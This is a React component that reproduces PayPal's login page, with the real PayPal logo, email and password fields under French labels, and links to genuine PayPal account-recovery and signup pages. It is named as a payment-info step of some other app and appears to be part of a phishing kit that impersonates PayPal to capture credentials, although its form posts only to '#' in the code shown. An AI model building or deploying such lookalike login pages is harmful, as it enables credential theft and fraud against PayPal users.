import "./InfoPaymentPaypal.css";

function InfoPaymentPaypal() {
  return (
    <>
      <div id="main" class="main" role="main">
        <section
          id="login"
          class="login"
          data-role="page"
          data-title="Log in to your PayPal account"
        >
          <div class="corral">
            <div id="content" class="contentContainer">
              <div className="header-paypal">
                <p class="paypal-logo paypal-logo-long">
                  <center>
                    <img
                      src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"
                      alt="PayPal Logo"
                    />
                  </center>
                </p>
              </div>
              <form
                action="#"
                method="post"
                class="proceed maskable"
                name="login"
                autocomplete="off"
                novalidate=""
              >
                <div id="passwordSection" class="clearfix">
                  <div class="textInput" id="login_emaildiv">
                    <div class="fieldWrapper">
                      <label for="email" class="fieldLabel">
                        Email
                      </label>
                      <input
                        id="email"
                        name="login_email"
                        type="email"
                        class="hasHelp validateEmpty"
                        required="required"
                        aria-required="true"
                        value=""
                        autocomplete="off"
                        placeholder="Email"
                      />
                    </div>
                  </div>

                  <div class="textInput lastInputField" id="login_passworddiv">
                    <div class="fieldWrapper">
                      <label for="password" class="fieldLabel">
                        Password
                      </label>
                      <input
                        id="password"
                        name="login_password"
                        type="password"
                        class="hasHelp validateEmpty"
                        required="required"
                        aria-required="true"
                        value=""
                        placeholder="Mot de passe"
                      />
                    </div>
                  </div>
                </div>
                <div class="actions actionsSpaced">
                  <button
                    class="button actionContinue"
                    type="submit"
                    id="btnLogin"
                    name="btnLogin"
                    value="Login"
                  >
                    Se connecter
                  </button>
                </div>
                <div class="forgotLink">
                  <a
                    href="https://www.paypal.com/authflow/email-recovery/?contextId=&redirectUri=%252Fsignin%253FreturnUri%253Dhttps%25253A%25252F%25252Fwww.paypal.com%25252Fmyaccount%25252Fsummary%2526state%253D%25253Fcountry.x%25253DFR%252526locale.x%25253Dfr_FR"
                    id="forgotPasswordModal"
                    class="scTrack:unifiedlogin-click-forgot-password"
                  >
                    Mot de passe oublié ?
                  </a>
                </div>
                <input type="hidden" id="bp_mid" name="bp_mid" value="" />
              </form>

              <a
                href="https://www.paypal.com/fr/welcome/signup/#/login_info"
                target="blank"
                class="button secondary"
                id="createAccount"
              >
                S'inscrire
              </a>
            </div>
          </div>
        </section>
      </div>
    </>
  );
}

export default InfoPaymentPaypal;
